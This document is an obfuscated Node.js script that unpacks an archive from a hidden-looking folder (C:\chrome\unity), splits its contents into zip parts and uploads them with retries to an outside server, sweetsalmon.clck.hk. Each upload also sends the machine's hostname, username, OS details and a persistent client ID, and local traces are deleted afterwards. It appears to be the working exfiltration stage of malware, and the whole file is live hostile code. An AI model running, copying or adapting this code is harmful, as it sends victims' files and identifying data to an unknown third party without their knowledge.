const _0xfd931b=_0x17d1;(function(_0xf1a7d6,_0x583842){const _0x3bb9b1=_0x17d1,_0x16e3b5=_0xf1a7d6();while(!![]){try{const _0x17cfb0=-parseInt(_0x3bb9b1(0x176))/0x1*(parseInt(_0x3bb9b1(0x15d))/0x2)+-parseInt(_0x3bb9b1(0x17f))/0x3*(parseInt(_0x3bb9b1(0x193))/0x4)+parseInt(_0x3bb9b1(0x169))/0x5*(parseInt(_0x3bb9b1(0x1b9))/0x6)+-parseInt(_0x3bb9b1(0x1a4))/0x7*(-parseInt(_0x3bb9b1(0x16a))/0x8)+parseInt(_0x3bb9b1(0x1b1))/0x9+parseInt(_0x3bb9b1(0x15e))/0xa*(-parseInt(_0x3bb9b1(0x159))/0xb)+parseInt(_0x3bb9b1(0x144))/0xc*(-parseInt(_0x3bb9b1(0x18b))/0xd);if(_0x17cfb0===_0x583842)break;else _0x16e3b5['push'](_0x16e3b5['shift']());}catch(_0x51c743){_0x16e3b5['push'](_0x16e3b5['shift']());}}}(_0xe39c,0x5f81a));const fs=require('fs'),os=require('os'),path=require('path'),{exec,execSync}=require(_0xfd931b(0x177)),http=require('http'),https=require('https'),AdmZip=require(_0xfd931b(0x17d)),rimraf=require(_0xfd931b(0x142)),CONFIG={'serverDomain':_0xfd931b(0x1c9),'serverPath':_0xfd931b(0x185),'serverPort':0x1f98,'apiKey':_0xfd931b(0x165),'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x927c0,'filePath':'C:\x5cchrome\x5cunity\x5carchive.zip','extractPath':_0xfd931b(0x1cc),'splitArchivesPath':_0xfd931b(0x171),'numParts':0x3,'maxSizePerFile':0x1c2*0x400*0x400};function ensureDirectoriesExist(){const _0x5ad2cc=_0xfd931b,_0x396dbc=[CONFIG['extractPath'],CONFIG[_0x5ad2cc(0x1ca)]];_0x396dbc[_0x5ad2cc(0x16e)](_0x3ceded=>{const _0x2260d1=_0x5ad2cc;if(!fs[_0x2260d1(0x156)](_0x3ceded))try{fs[_0x2260d1(0x17e)](_0x3ceded,{'recursive':!![]}),log(_0x2260d1(0x179)+_0x3ceded);}catch(_0x38790a){log(_0x2260d1(0x151)+_0x3ceded+':\x20'+_0x38790a['message'],!![]);throw _0x38790a;}});}function _0xe39c(){const _0x17ca4f=['1904442DwGGnn','\x20directories','trim','No\x20directories\x20found\x20in\x20extracted\x20archive','statSync','http','Created\x20archive\x20part\x20','now','\x20to\x20','archive_','readFileSync','name','log','Request\x20error:\x20','Upload\x20process\x20completed.\x20Successfully\x20uploaded\x20','push','sweetsalmon.clck.hk','splitArchivesPath','pow','C:\x5cchrome\x5cunity\x5cextracted','end','rimraf','Uploading\x20archive\x20','48RAOkdG','\x20seconds...\x20(Attempt\x20','Cleaned\x20extraction\x20directory:\x20','startsWith','data','username','from','maxSizePerFile','slice','toFixed','Request\x20timed\x20out','destroy','://','Error\x20creating\x20directory\x20','toString','statusCode','Splitting\x20files\x20into\x20','retryDelay','existsSync','basename','writeZip','22GqELor','\x20seconds','write','size','36686KDpwWn','467440gBrsTx','0\x20Bytes','filePath','extractAllTo','Failed\x20to\x20upload\x20archive\x20','Request\x20timed\x20out\x20after\x20','Error\x20writing\x20to\x20log:\x20','tJz4uRVCwl2eEwyPTudYP9iGRfgq','\x20of\x20','Upload\x20failed:\x20Server\x20returned\x20status\x20','numParts','10bdBnlS','55352IYjsFt','Creating\x20part\x20','appendFileSync','isDirectory','forEach','\x20archives.','serverDomain','C:\x5cchrome\x5cunity\x5csplit','\x20parts','sync',')\x20reached,\x20giving\x20up','exit','41oGledm','child_process','multipart/form-data;\x20boundary=','Directory\x20created:\x20','\x20total\x20size','serverPath','Failed\x20to\x20extract\x20archive,\x20terminating\x20process','adm-zip','mkdirSync','972jEqkvu','\x20archives','File\x20is\x20empty','Removed\x20extraction\x20directory:\x20','maxRetries','serverPort','/api/files/upload','arch','Waiting\x203\x20seconds\x20before\x20next\x20upload...','Error\x20reading\x20client\x20ID:\x20','readdirSync','Cleaning\x20up\x20temporary\x20files...','1520727VtIxee','https','Cleaned\x20split\x20archives\x20directory:\x20','filter','hostname','map','client-id.txt','Found\x20file:\x20','2584aCkhii','length','----WebKitFormBoundary','Successfully\x20uploaded\x20archive\x20','utf8','Content-Type:\x20application/octet-stream','type','\x0d\x0a--','Found\x20','.zip','join','\x20directories\x20to\x20split','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','endsWith','dirname','ceil','extractPath','623dTIbJq','random','File\x20not\x20found:\x20','floor','split_uploader.log','Failed\x20to\x20split\x20files,\x20terminating\x20process','message','timeout','POST','Server\x20response:\x20','Upload\x20completed\x20in\x20','error','addLocalFile','5970240VuTYBj','Bytes','Maximum\x20retry\x20count\x20(','writeFileSync','catch','substring','Starting\x20upload\x20to\x20','Upload\x20failed:\x20'];_0xe39c=function(){return _0x17ca4f;};return _0xe39c();}function log(_0x1bf18b,_0x582489=![]){const _0x31a055=_0xfd931b,_0x3c8311=new Date()['toISOString'](),_0x256870='['+_0x3c8311+']\x20'+_0x1bf18b;_0x582489?console[_0x31a055(0x1af)](_0x256870):console['log'](_0x256870);try{fs[_0x31a055(0x16c)](_0x31a055(0x1a8),_0x256870+'\x0a');}catch(_0xd028e){console[_0x31a055(0x1af)](_0x31a055(0x164)+_0xd028e[_0x31a055(0x1aa)]);}}function formatFileSize(_0xbed8a9){const _0x5b5320=_0xfd931b;if(_0xbed8a9===0x0)return _0x5b5320(0x15f);const _0x2a5947=0x400,_0x5d9ed8=[_0x5b5320(0x1b2),'KB','MB','GB','TB'],_0x963bee=Math[_0x5b5320(0x1a7)](Math[_0x5b5320(0x1c5)](_0xbed8a9)/Math[_0x5b5320(0x1c5)](_0x2a5947));return parseFloat((_0xbed8a9/Math[_0x5b5320(0x1cb)](_0x2a5947,_0x963bee))[_0x5b5320(0x14d)](0x2))+'\x20'+_0x5d9ed8[_0x963bee];}function getClientId(){const _0x2d178a=_0xfd931b;try{if(fs[_0x2d178a(0x156)](_0x2d178a(0x191)))return fs['readFileSync'](_0x2d178a(0x191),_0x2d178a(0x197))[_0x2d178a(0x1bb)]();}catch(_0x2b064c){log(_0x2d178a(0x188)+_0x2b064c[_0x2d178a(0x1aa)],!![]);}const _0x3837ab=Math[_0x2d178a(0x1a5)]()[_0x2d178a(0x152)](0x24)[_0x2d178a(0x1b6)](0x2,0xa);try{fs[_0x2d178a(0x1b4)](_0x2d178a(0x191),_0x3837ab);}catch(_0x2dc742){log('Error\x20writing\x20client\x20ID:\x20'+_0x2dc742[_0x2d178a(0x1aa)],!![]);}return _0x3837ab;}function extractZipArchive(){const _0x40d1fb=_0xfd931b;try{log('Extracting\x20archive:\x20'+CONFIG[_0x40d1fb(0x160)]+_0x40d1fb(0x1c1)+CONFIG[_0x40d1fb(0x1a3)]);if(!fs[_0x40d1fb(0x156)](CONFIG[_0x40d1fb(0x160)]))throw new Error('Source\x20archive\x20not\x20found:\x20'+CONFIG[_0x40d1fb(0x160)]);fs[_0x40d1fb(0x156)](CONFIG['extractPath'])&&(rimraf[_0x40d1fb(0x173)](CONFIG['extractPath']+'/*'),log(_0x40d1fb(0x146)+CONFIG[_0x40d1fb(0x1a3)]));const _0x2ffd23=new AdmZip(CONFIG[_0x40d1fb(0x160)]);return _0x2ffd23[_0x40d1fb(0x161)](CONFIG['extractPath'],!![]),log('Archive\x20extracted\x20successfully\x20to:\x20'+CONFIG['extractPath']),!![];}catch(_0x16e946){return log('Error\x20extracting\x20archive:\x20'+_0x16e946[_0x40d1fb(0x1aa)],!![]),![];}}function splitFiles(){const _0x530f6b=_0xfd931b;try{log(_0x530f6b(0x154)+CONFIG[_0x530f6b(0x168)]+_0x530f6b(0x172));const _0xfc94c5=fs[_0x530f6b(0x189)](CONFIG[_0x530f6b(0x1a3)],{'withFileTypes':!![]}),_0x18223e=_0xfc94c5[_0x530f6b(0x18e)](_0x1c93ee=>_0x1c93ee[_0x530f6b(0x16d)]())[_0x530f6b(0x190)](_0x77d21a=>_0x77d21a['name']);log(_0x530f6b(0x19b)+_0x18223e['length']+_0x530f6b(0x19e));if(_0x18223e[_0x530f6b(0x194)]===0x0)return log(_0x530f6b(0x1bc),!![]),![];const _0x592c22=Math[_0x530f6b(0x1a2)](_0x18223e[_0x530f6b(0x194)]/CONFIG['numParts']);fs['existsSync'](CONFIG[_0x530f6b(0x1ca)])&&(rimraf['sync'](CONFIG['splitArchivesPath']+'/*'),log(_0x530f6b(0x18d)+CONFIG['splitArchivesPath']));for(let _0x26f1be=0x0;_0x26f1be<CONFIG[_0x530f6b(0x168)];_0x26f1be++){const _0x105c8f=_0x26f1be*_0x592c22,_0x513ac9=Math['min']((_0x26f1be+0x1)*_0x592c22,_0x18223e[_0x530f6b(0x194)]),_0x3a753f=_0x18223e[_0x530f6b(0x14c)](_0x105c8f,_0x513ac9);if(_0x3a753f[_0x530f6b(0x194)]===0x0)continue;const _0x5057a6=path['join'](CONFIG[_0x530f6b(0x1ca)],_0x530f6b(0x1c2)+(_0x26f1be+0x1)+'.zip');log(_0x530f6b(0x16b)+(_0x26f1be+0x1)+'\x20archive\x20with\x20'+_0x3a753f[_0x530f6b(0x194)]+_0x530f6b(0x1ba));const _0x27b361=new AdmZip();_0x3a753f['forEach'](_0x158139=>{const _0x4fc1b0=_0x530f6b,_0x2e4e62=path[_0x4fc1b0(0x19d)](CONFIG[_0x4fc1b0(0x1a3)],_0x158139);addDirectoryToZip(_0x27b361,_0x2e4e62,_0x158139);}),_0x27b361[_0x530f6b(0x158)](_0x5057a6);const _0xeb1f24=fs[_0x530f6b(0x1bd)](_0x5057a6)[_0x530f6b(0x15c)];log(_0x530f6b(0x1bf)+(_0x26f1be+0x1)+':\x20'+_0x5057a6+'\x20('+formatFileSize(_0xeb1f24)+')'),_0xeb1f24>CONFIG[_0x530f6b(0x14b)]&&log('Warning:\x20Archive\x20part\x20'+(_0x26f1be+0x1)+'\x20exceeds\x20the\x20recommended\x20size\x20limit\x20of\x20'+formatFileSize(CONFIG[_0x530f6b(0x14b)]),!![]);}return log('Successfully\x20split\x20into\x20'+CONFIG[_0x530f6b(0x168)]+_0x530f6b(0x180)),!![];}catch(_0x5863d2){return log('Error\x20splitting\x20files:\x20'+_0x5863d2[_0x530f6b(0x1aa)],!![]),![];}}function addDirectoryToZip(_0x2f75c3,_0x42b312,_0x10da1c){const _0x51dd5d=_0xfd931b,_0x4a6be8=fs[_0x51dd5d(0x189)](_0x42b312,{'withFileTypes':!![]});_0x4a6be8[_0x51dd5d(0x16e)](_0x54d5ce=>{const _0x5bb390=_0x51dd5d,_0x38d26c=path[_0x5bb390(0x19d)](_0x42b312,_0x54d5ce['name']),_0x3fa2c0=path[_0x5bb390(0x19d)](_0x10da1c,_0x54d5ce[_0x5bb390(0x1c4)]);_0x54d5ce['isDirectory']()?addDirectoryToZip(_0x2f75c3,_0x38d26c,_0x3fa2c0):_0x2f75c3[_0x5bb390(0x1b0)](_0x38d26c,path[_0x5bb390(0x1a1)](_0x3fa2c0));});}function uploadFile(_0xad76ec,_0xb08087=0x0){const _0x4c346d=_0xfd931b;return new Promise((_0xd3e3b9,_0x46c393)=>{const _0x4a2e85=_0x17d1;try{if(!fs[_0x4a2e85(0x156)](_0xad76ec))return log(_0x4a2e85(0x1a6)+_0xad76ec,!![]),_0x46c393(new Error(_0x4a2e85(0x1a6)+_0xad76ec));const _0x470120=fs[_0x4a2e85(0x1bd)](_0xad76ec),_0x2598dc=_0x470120[_0x4a2e85(0x15c)];if(_0x2598dc===0x0)return log(_0x4a2e85(0x181),!![]),_0x46c393(new Error(_0x4a2e85(0x181)));log(_0x4a2e85(0x192)+_0xad76ec+'\x20('+formatFileSize(_0x2598dc)+')');const _0x57f97f={'hostname':os[_0x4a2e85(0x18f)](),'platform':os['platform'](),'type':os[_0x4a2e85(0x199)](),'arch':os[_0x4a2e85(0x186)](),'username':os['userInfo']()[_0x4a2e85(0x149)],'id':getClientId()},_0x3a7552=CONFIG[_0x4a2e85(0x184)]===0x1bb?_0x4a2e85(0x18c):_0x4a2e85(0x1be),_0x35e114=_0x3a7552+_0x4a2e85(0x150)+CONFIG[_0x4a2e85(0x170)]+':'+CONFIG[_0x4a2e85(0x184)]+CONFIG[_0x4a2e85(0x17b)];log(_0x4a2e85(0x1b7)+_0x35e114);const _0x3994a8=Date[_0x4a2e85(0x1c0)](),_0xd647e5=fs[_0x4a2e85(0x1c3)](_0xad76ec),_0x2e51bb=_0x4a2e85(0x195)+Math[_0x4a2e85(0x1a5)]()[_0x4a2e85(0x152)](0x10)[_0x4a2e85(0x1b6)](0x2),_0x179e64=[];_0x179e64[_0x4a2e85(0x1c8)]('--'+_0x2e51bb),_0x179e64[_0x4a2e85(0x1c8)]('Content-Disposition:\x20form-data;\x20name=\x22info\x22'),_0x179e64[_0x4a2e85(0x1c8)]('Content-Type:\x20application/json'),_0x179e64[_0x4a2e85(0x1c8)](''),_0x179e64[_0x4a2e85(0x1c8)](JSON['stringify'](_0x57f97f)),_0x179e64[_0x4a2e85(0x1c8)]('--'+_0x2e51bb),_0x179e64[_0x4a2e85(0x1c8)](_0x4a2e85(0x19f)+path['basename'](_0xad76ec)+'\x22'),_0x179e64[_0x4a2e85(0x1c8)](_0x4a2e85(0x198)),_0x179e64[_0x4a2e85(0x1c8)]('');const _0x38b817=_0x179e64['join']('\x0d\x0a')+'\x0d\x0a',_0x450497=_0x4a2e85(0x19a)+_0x2e51bb+'--\x0d\x0a',_0x5866a6=Buffer[_0x4a2e85(0x14a)](_0x38b817),_0x16e7af=Buffer[_0x4a2e85(0x14a)](_0x450497),_0x523375=_0x5866a6[_0x4a2e85(0x194)]+_0xd647e5[_0x4a2e85(0x194)]+_0x16e7af[_0x4a2e85(0x194)],_0x29a897={'hostname':CONFIG[_0x4a2e85(0x170)],'port':CONFIG[_0x4a2e85(0x184)],'path':CONFIG[_0x4a2e85(0x17b)],'method':_0x4a2e85(0x1ac),'headers':{'Content-Type':_0x4a2e85(0x178)+_0x2e51bb,'Content-Length':_0x523375,'X-API-Key':CONFIG['apiKey']},'timeout':CONFIG['timeout']},_0x13a56e=(_0x3a7552===_0x4a2e85(0x18c)?https:http)['request'](_0x29a897,_0x2fd565=>{const _0x1c38cf=_0x4a2e85;let _0x2a6de3='';_0x2fd565['on'](_0x1c38cf(0x148),_0x2f87e7=>{_0x2a6de3+=_0x2f87e7;}),_0x2fd565['on']('end',()=>{const _0x1ed738=_0x1c38cf,_0x48c783=(Date['now']()-_0x3994a8)/0x3e8;log(_0x1ed738(0x1ae)+_0x48c783['toFixed'](0x2)+_0x1ed738(0x15a)),_0x2fd565['statusCode']>=0xc8&&_0x2fd565[_0x1ed738(0x153)]<0x12c?(log(_0x1ed738(0x1ad)+_0x2a6de3),_0xd3e3b9(!![])):(log(_0x1ed738(0x167)+_0x2fd565[_0x1ed738(0x153)]+':\x20'+_0x2a6de3,!![]),_0x46c393(new Error('Server\x20returned\x20status\x20'+_0x2fd565['statusCode'])));});});_0x13a56e['on'](_0x4a2e85(0x1af),_0x809210=>{const _0x5bd5d4=_0x4a2e85;log(_0x5bd5d4(0x1c6)+_0x809210[_0x5bd5d4(0x1aa)],!![]),_0x46c393(_0x809210);}),_0x13a56e['on'](_0x4a2e85(0x1ab),()=>{const _0x2a1087=_0x4a2e85;log(_0x2a1087(0x163)+CONFIG[_0x2a1087(0x1ab)]/0x3e8+'\x20seconds',!![]),_0x13a56e[_0x2a1087(0x14f)](),_0x46c393(new Error(_0x2a1087(0x14e)));}),_0x13a56e[_0x4a2e85(0x15b)](_0x5866a6),_0x13a56e[_0x4a2e85(0x15b)](_0xd647e5),_0x13a56e['write'](_0x16e7af),_0x13a56e[_0x4a2e85(0x1cd)](),log('File\x20upload\x20started:\x20'+formatFileSize(_0x2598dc)+_0x4a2e85(0x17a));}catch(_0x3fc09f){log(_0x4a2e85(0x1b8)+_0x3fc09f[_0x4a2e85(0x1aa)],!![]),_0x46c393(_0x3fc09f);}})[_0x4c346d(0x1b5)](async _0x403308=>{const _0x2a4723=_0x4c346d;return _0xb08087<CONFIG[_0x2a4723(0x183)]?(log('Retrying\x20in\x20'+CONFIG['retryDelay']/0x3e8+_0x2a4723(0x145)+(_0xb08087+0x1)+'\x20of\x20'+CONFIG[_0x2a4723(0x183)]+')'),await new Promise(_0x7189b2=>setTimeout(_0x7189b2,CONFIG[_0x2a4723(0x155)])),uploadFile(_0xad76ec,_0xb08087+0x1)):(log(_0x2a4723(0x1b3)+CONFIG['maxRetries']+_0x2a4723(0x174),!![]),![]);});}async function main(){const _0x33b3be=_0xfd931b;try{log('Starting\x20split\x20archive\x20and\x20upload\x20process'),ensureDirectoriesExist();const _0x53f96f=extractZipArchive();!_0x53f96f&&(log(_0x33b3be(0x17c),!![]),process[_0x33b3be(0x175)](0x1));const _0x3d36ae=splitFiles();!_0x3d36ae&&(log(_0x33b3be(0x1a9),!![]),process['exit'](0x1));const _0x45b81c=fs[_0x33b3be(0x189)](CONFIG[_0x33b3be(0x1ca)])[_0x33b3be(0x18e)](_0x4cfbeb=>_0x4cfbeb[_0x33b3be(0x147)](_0x33b3be(0x1c2))&&_0x4cfbeb[_0x33b3be(0x1a0)](_0x33b3be(0x19c)))[_0x33b3be(0x190)](_0x4a6b35=>path[_0x33b3be(0x19d)](CONFIG[_0x33b3be(0x1ca)],_0x4a6b35));log('Found\x20'+_0x45b81c['length']+'\x20archives\x20to\x20upload');let _0x2fc745=0x0;for(let _0x5cfb32=0x0;_0x5cfb32<_0x45b81c[_0x33b3be(0x194)];_0x5cfb32++){const _0x3306bd=_0x45b81c[_0x5cfb32];log(_0x33b3be(0x143)+(_0x5cfb32+0x1)+_0x33b3be(0x166)+_0x45b81c[_0x33b3be(0x194)]+':\x20'+path[_0x33b3be(0x157)](_0x3306bd));const _0x46e59e=await uploadFile(_0x3306bd);_0x46e59e?(log(_0x33b3be(0x196)+(_0x5cfb32+0x1)+_0x33b3be(0x166)+_0x45b81c[_0x33b3be(0x194)]),_0x2fc745++):log(_0x33b3be(0x162)+(_0x5cfb32+0x1)+_0x33b3be(0x166)+_0x45b81c[_0x33b3be(0x194)],!![]),_0x5cfb32<_0x45b81c[_0x33b3be(0x194)]-0x1&&(log(_0x33b3be(0x187)),await new Promise(_0xb78937=>setTimeout(_0xb78937,0xbb8)));}log(_0x33b3be(0x1c7)+_0x2fc745+_0x33b3be(0x166)+_0x45b81c[_0x33b3be(0x194)]+_0x33b3be(0x16f)),_0x2fc745===_0x45b81c[_0x33b3be(0x194)]&&(log(_0x33b3be(0x18a)),rimraf[_0x33b3be(0x173)](CONFIG['extractPath']),log(_0x33b3be(0x182)+CONFIG[_0x33b3be(0x1a3)])),process[_0x33b3be(0x175)](_0x2fc745===_0x45b81c[_0x33b3be(0x194)]?0x0:0x1);}catch(_0x59369f){log('Unexpected\x20error:\x20'+_0x59369f[_0x33b3be(0x1aa)],!![]),process['exit'](0x1);}}function _0x17d1(_0x30b7ad,_0x2f6e63){const _0xe39c92=_0xe39c();return _0x17d1=function(_0x17d11c,_0x9764ad){_0x17d11c=_0x17d11c-0x142;let _0x4a501c=_0xe39c92[_0x17d11c];return _0x4a501c;},_0x17d1(_0x30b7ad,_0x2f6e63);}main();
